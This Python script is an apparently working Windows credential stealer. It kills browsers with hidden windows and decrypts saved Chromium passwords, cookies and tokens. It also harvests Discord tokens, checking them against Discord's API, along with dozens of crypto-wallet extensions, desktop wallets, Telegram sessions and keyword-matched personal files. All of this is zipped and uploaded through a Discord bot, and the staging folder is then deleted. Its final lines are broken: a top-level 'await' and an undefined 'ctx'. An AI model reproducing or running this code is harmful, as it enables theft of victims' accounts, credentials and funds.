import base64
import json
import os
import re
import sqlite3
import shutil
import subprocess
import zipfile
import sys
import threading
import concurrent.futures
from zipfile import ZipFile
from urllib.request import Request, urlopen

# Install non-standard packages first
required_packages = [
    "pycryptodome",
    "pywin32", 
    "requests"
]

for package in required_packages:
    try:
        # Try to import first to check if already installed
        if package == "pycryptodome":
            __import__('Crypto')
        elif package == "pywin32":
            __import__('win32crypt')
        elif package == "requests":
            __import__('requests')
        print(f"✅ {package} already installed")
    except ImportError:
        # Install using pip
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"✅ Installed {package}")
        except subprocess.CalledProcessError:
            print(f"❌ Failed to install {package}")
            sys.exit(1)

# Now import the non-standard packages after installation
import win32crypt
import requests
from Crypto.Cipher import AES
import discord

# Rest of your existing code continues here...
async def upload_to_discord(ctx):
    try:
        # Create zip file of all collected data
        zip_path = os.path.join(os.getenv('TEMP'), "heavy_data_collection.zip")
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            storage_path = os.getenv('APPDATA') + "\\gruppe_storage"
            if os.path.exists(storage_path):
                for root, dirs, files in os.walk(storage_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, storage_path))
        
        # Send the zip file via the command context
        with open(zip_path, 'rb') as f:
            await ctx.send(file=discord.File(f, "heavy_data_collection.zip"))
        
        # Clean up
        if os.path.exists(zip_path):
            os.remove(zip_path)
            
    except Exception as e:
        await ctx.send(f"Error uploading heavy data: {str(e)}")

# Initialize all paths and configurations from original code
USER_PROFILE = os.getenv('USERPROFILE')
APPDATA = os.getenv('APPDATA')
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
STORAGE_PATH = APPDATA + "\\gruppe_storage"
STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

if not os.path.exists(STORAGE_PATH):
    os.makedirs(STORAGE_PATH)

# All original browser configurations
CHROMIUM_BROWSERS = [
    {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},
    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},
    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},
    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},
]

CHROMIUM_SUBPATHS = [
    {"name": "None", "path": ""},
    {"name": "Default", "path": "Default"},
    {"name": "Profile 1", "path": "Profile 1"},
    {"name": "Profile 2", "path": "Profile 2"},
    {"name": "Profile 3", "path": "Profile 3"},
    {"name": "Profile 4", "path": "Profile 4"},
    {"name": "Profile 5", "path": "Profile 5"},
]

# All 58 browser extensions
BROWSER_EXTENSIONS = [
    {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
    {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
    {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
    {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},
    {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
    {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},
    {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},
    {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},
    {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},
    {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},
    {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},
    {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
    {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},
    {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},
    {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},
    {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},
    {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},
    {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},
    {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},
    {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
    {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
    {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
    {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},
    {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},
    {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
    {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
    {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
    {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},
    {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},
    {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},
    {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},
    {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},
    {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},
    {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},
    {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},
    {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},
    {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},
    {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
    {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},
    {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},
    {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},
    {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},
    {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},
    {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},
    {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},
    {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
    {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},
    {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},
    {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
    {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},
    {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},
    {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},
    {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}
]

# All 11 wallet paths
WALLET_PATHS = [
    {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},
    {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},
    {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},
    {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},
    {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},
    {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},
    {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},
    {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},
    {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore")},
    {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},
    {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},
]

# All original paths to search
PATHS_TO_SEARCH = [
    USER_PROFILE + "\\Desktop",
    USER_PROFILE + "\\Documents",
    USER_PROFILE + "\\Downloads",
    USER_PROFILE + "\\OneDrive\\Documents",
    USER_PROFILE + "\\OneDrive\\Desktop",
]

# All 22 file keywords
FILE_KEYWORDS = [
    "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account", 
    "acount", "paypal", "banque", "metamask", "wallet", "crypto", "exodus", 
    "discord", "2fa", "code", "memo", "compte", "token", "backup", "seecret"
]

# All original allowed extensions
ALLOWED_EXTENSIONS = [
    ".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", 
    ".odt", ".pdf", ".rtf", ".json", ".csv", ".db", ".jpg", ".jpeg", 
    ".png", ".gif", ".webp", ".mp4"
]

# All 26 Discord paths
DISCORD_PATHS = [
    {"name": "Discord", "path": os.path.join(APPDATA, "discord", "Local Storage", "leveldb")},
    {"name": "Discord Canary", "path": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb")},
    {"name": "Discord PTB", "path": os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb")},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb")},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb")},
    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data", "Local Storage", "leveldb")},
    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data", "Local Storage", "leveldb")},
    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data", "Local Storage", "leveldb")},
    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data", "Local Storage", "leveldb")},
    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data", "Local Storage", "leveldb")},
    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data", "Local Storage", "leveldb")},
    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb")},
    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb")},
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Chrome1", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb")},
    {"name": "Chrome2", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb")},
    {"name": "Chrome3", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb")},
    {"name": "Chrome4", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb")},
    {"name": "Chrome5", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb")},
    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb")},
    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Yandex", "path": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data", "Default", "Local Storage", "leveldb")}
]

# Global collections
PASSWORDS = []
COOKIES = []
WEB_DATA = []
DISCORD_TOKENS = []
DISCORD_IDS = []

def kill_process_hidden(process_name):
    """Kill processes without showing windows"""
    subprocess.run(f'taskkill /F /IM "{process_name}" >nul 2>&1', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

def kill_all_browsers():
    """Kill all browser processes efficiently and hidden"""
    browser_processes = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "msedge.exe", "yandex.exe"]
    for process in browser_processes:
        kill_process_hidden(process)

def decrypt_data(data, key):
    """Decrypt browser data"""
    try:
        if data.startswith(b'v10') or data.startswith(b'v11'):
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        else:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
    except:
        return ""

def validate_discord_token(token):
    """Validate Discord token"""
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def zip_to_storage(name, source, destination):
    """Zip files/folders to storage"""
    try:
        if os.path.isfile(source):
            with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
                z.write(source, os.path.basename(source))
        else:
            with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
                for root, dirs, files in os.walk(source):
                    for file in files:
                        file_path = os.path.join(root, file)
                        z.write(file_path, os.path.relpath(file_path, os.path.join(source, '..')))
    except:
        pass

def process_browser_data(browser_info):
    """Process all data for a single browser (passwords, cookies, web data)"""
    browser_name, browser_path = browser_info["name"], browser_info["path"]
    
    try:
        local_state = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state):
            return
        
        with open(local_state, "r", encoding="utf-8") as f:
            local_state_data = json.loads(f.read())
        
        key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
        decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        
        # Process each profile
        for subpath in CHROMIUM_SUBPATHS:
            profile_path = os.path.join(browser_path, subpath["path"])
            if not os.path.exists(profile_path):
                continue
                
            # Process passwords
            try:
                login_data_file = os.path.join(profile_path, "Login Data")
                if os.path.exists(login_data_file):
                    temp_db = os.path.join(profile_path, f"{browser_name}-pw.db")
                    shutil.copy(login_data_file, temp_db)
                    connection = sqlite3.connect(temp_db)
                    cursor = connection.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        origin_url, username, encrypted_password = row
                        password = decrypt_data(encrypted_password, decryption_key)
                        if username or password:
                            PASSWORDS.append({
                                "browser": browser_name,
                                "profile": subpath["name"],
                                "url": origin_url,
                                "username": username,
                                "password": password
                            })
                    
                    cursor.close()
                    connection.close()
                    os.remove(temp_db)
            except:
                pass
            
            # Process cookies
            try:
                cookies_file = os.path.join(profile_path, "Network", "Cookies")
                if os.path.exists(cookies_file):
                    temp_db = os.path.join(profile_path, "Network", f"{browser_name}-ck.db")
                    shutil.copy(cookies_file, temp_db)
                    connection = sqlite3.connect(temp_db)
                    cursor = connection.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    
                    cookie_str = ""
                    for row in cursor.fetchall():
                        host, name, encrypted_value = row
                        value = decrypt_data(encrypted_value, decryption_key)
                        cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
                    
                    if cookie_str:
                        COOKIES.append({
                            "browser": browser_name,
                            "profile": subpath["name"],
                            "cookies": base64.b64encode(cookie_str.encode()).decode()
                        })
                    
                    cursor.close()
                    connection.close()
                    os.remove(temp_db)
            except:
                pass
            
            # Process web data
            try:
                web_data_file = os.path.join(profile_path, "Web Data")
                if os.path.exists(web_data_file):
                    temp_db = os.path.join(profile_path, f"{browser_name}-webdata.db")
                    shutil.copy(web_data_file, temp_db)
                    connection = sqlite3.connect(temp_db)
                    cursor = connection.cursor()
                    cursor.execute("SELECT service, encrypted_token FROM token_service")
                    
                    for row in cursor.fetchall():
                        web_service, encrypted_token = row
                        web_token = decrypt_data(encrypted_token, decryption_key)
                        WEB_DATA.append({
                            "browser": browser_name,
                            "profile": subpath["name"],
                            "service": web_service,
                            "token": web_token
                        })
                    
                    cursor.close()
                    connection.close()
                    os.remove(temp_db)
            except:
                pass
            
            # Process all 58 browser extensions
            for extension in BROWSER_EXTENSIONS:
                extension_path = profile_path + extension["path"]
                if os.path.exists(extension_path):
                    zip_to_storage(f"{browser_name}-{subpath['name']}-{extension['name']}", extension_path, STORAGE_PATH)
                    
    except:
        pass

def process_discord_tokens():
    """Process Discord tokens from all 26 paths"""
    for discord_path in DISCORD_PATHS:
        if not os.path.exists(discord_path["path"]):
            continue
            
        try:
            name_without_spaces = discord_path["name"].replace(" ", "")
            if "cord" in discord_path["path"]:
                local_state_path = APPDATA + f"\\{name_without_spaces}\\Local State"
                if not os.path.exists(local_state_path):
                    continue
                    
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state_data = json.loads(f.read())
                
                key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
                decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                
                for file_name in os.listdir(discord_path["path"]):
                    if file_name[-3:] not in ["ldb", "log"]:
                        continue
                    file_path = os.path.join(discord_path["path"], file_name)
                    for line in [x.strip() for x in open(file_path, errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            token = decrypt_data(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), decryption_key)
                            token_data = validate_discord_token(token)
                            if token_data and token_data["id"] not in DISCORD_IDS:
                                DISCORD_IDS.append(token_data["id"])
                                username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                                phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                DISCORD_TOKENS.append({
                                    "token": token, 
                                    "user_id": token_data["id"], 
                                    "username": username,
                                    "display_name": token_data["global_name"], 
                                    "email": token_data["email"],
                                    "phone": phone_number
                                })
            else:
                for file_name in os.listdir(discord_path["path"]):
                    if file_name[-3:] not in ["ldb", "log"]:
                        continue
                    file_path = os.path.join(discord_path["path"], file_name)
                    for line in [x.strip() for x in open(file_path, errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                            token_data = validate_discord_token(token)
                            if token_data and token_data["id"] not in DISCORD_IDS:
                                DISCORD_IDS.append(token_data["id"])
                                username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                                phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                DISCORD_TOKENS.append({
                                    "token": token, 
                                    "user_id": token_data["id"], 
                                    "username": username,
                                    "display_name": token_data["global_name"], 
                                    "email": token_data["email"],
                                    "phone": phone_number
                                })
        except:
            pass

def process_wallets():
    """Process all 11 wallet paths"""
    for wallet in WALLET_PATHS:
        if os.path.exists(wallet["path"]):
            zip_to_storage(wallet["name"], wallet["path"], STORAGE_PATH)

def search_sensitive_files():
    """Search for sensitive files using all 22 keywords"""
    for path in PATHS_TO_SEARCH:
        if not os.path.exists(path):
            continue
        for root, _, files in os.walk(path):
            for file_name in files:
                for keyword in FILE_KEYWORDS:
                    if keyword in file_name.lower():
                        for extension in ALLOWED_EXTENSIONS:
                            if file_name.endswith(extension):
                                try:
                                    file_path = os.path.join(root, file_name)
                                    zip_to_storage(f"sensitive_{file_name}", file_path, STORAGE_PATH)
                                except:
                                    pass

def process_firefox():
    """Process Firefox data"""
    firefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(firefox_path):
        return
        
    kill_process_hidden("firefox.exe")
    
    for profile in os.listdir(firefox_path):
        try:
            if profile.endswith('.default') or profile.endswith('.default-release'):
                profile_path = os.path.join(firefox_path, profile)
                cookies_file = os.path.join(profile_path, "cookies.sqlite")
                if os.path.exists(cookies_file):
                    temp_cookies = os.path.join(profile_path, "cookies-copy.sqlite")
                    shutil.copy(cookies_file, temp_cookies)
                    connection = sqlite3.connect(temp_cookies)
                    cursor = connection.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    
                    cookie_str = ""
                    for row in cursor.fetchall():
                        host, name, value = row
                        cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
                    
                    if cookie_str:
                        COOKIES.append({
                            "browser": "Firefox", 
                            "profile": profile, 
                            "cookies": base64.b64encode(cookie_str.encode()).decode()
                        })
                    
                    cursor.close()
                    connection.close()
                    os.remove(temp_cookies)
        except:
            continue

def telegram_collection():
    """Collect Telegram data"""
    try:
        kill_process_hidden("Telegram.exe")
        user = os.path.expanduser("~")
        source_path = os.path.join(user, "AppData\\Roaming\\Telegram Desktop\\tdata")
        temp_path = os.path.join(user, "AppData\\Local\\Temp\\tdata_session")
        zip_path = os.path.join(user, "AppData\\Local\\Temp", "tdata_session.zip")

        if os.path.exists(source_path):
            if os.path.exists(temp_path):
                shutil.rmtree(temp_path)
            shutil.copytree(source_path, temp_path)

            with ZipFile(zip_path, 'w') as zipf:
                for root, dirs, files in os.walk(temp_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, os.path.join(temp_path, '..')))

            shutil.move(zip_path, os.path.join(STORAGE_PATH, "tdata_session.zip"))
            shutil.rmtree(temp_path)
    except:
        pass

def save_collected_data():
    """Save all collected data to files"""
    # Save passwords
    if PASSWORDS:
        with open(os.path.join(STORAGE_PATH, "passwords.json"), "w") as f:
            json.dump(PASSWORDS, f, indent=2)
    
    # Save cookies
    for cookie in COOKIES:
        cookie_file = os.path.join(STORAGE_PATH, f"cookies_{cookie['browser']}_{cookie['profile']}.txt")
        with open(cookie_file, "w") as f:
            f.write(base64.b64decode(cookie["cookies"]).decode())
    
    # Save web data
    if WEB_DATA:
        with open(os.path.join(STORAGE_PATH, "web_data.json"), "w") as f:
            json.dump(WEB_DATA, f, indent=2)
    
    # Save Discord tokens
    if DISCORD_TOKENS:
        with open(os.path.join(STORAGE_PATH, "discord_tokens.txt"), "w") as f:
            for token_data in DISCORD_TOKENS:
                f.write(f"{'='*50}\n")
                f.write(f"ID: {token_data['user_id']}\n")
                f.write(f"USERNAME: {token_data['username']}\n")
                f.write(f"DISPLAY NAME: {token_data['display_name']}\n")
                f.write(f"EMAIL: {token_data['email']}\n")
                f.write(f"PHONE: {token_data['phone']}\n")
                f.write(f"TOKEN: {token_data['token']}\n")
                f.write(f"{'='*50}\n\n")

def main_collection():
    """Main data collection function with threading"""
    # Kill all browsers first
    kill_all_browsers()
    
    # Use ThreadPoolExecutor for parallel processing
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
        # Process Chromium browsers in parallel
        executor.map(process_browser_data, CHROMIUM_BROWSERS)
        
        # Process other data sources in parallel
        executor.submit(process_firefox)
        executor.submit(process_discord_tokens)
        executor.submit(process_wallets)
        executor.submit(search_sensitive_files)
        executor.submit(telegram_collection)
    
    # Save all collected data
    save_collected_data()

# Main execution
# Main execution
main_collection()
await upload_to_discord(ctx)

# Final cleanup
try:
    shutil.rmtree(STORAGE_PATH)
except:
    pass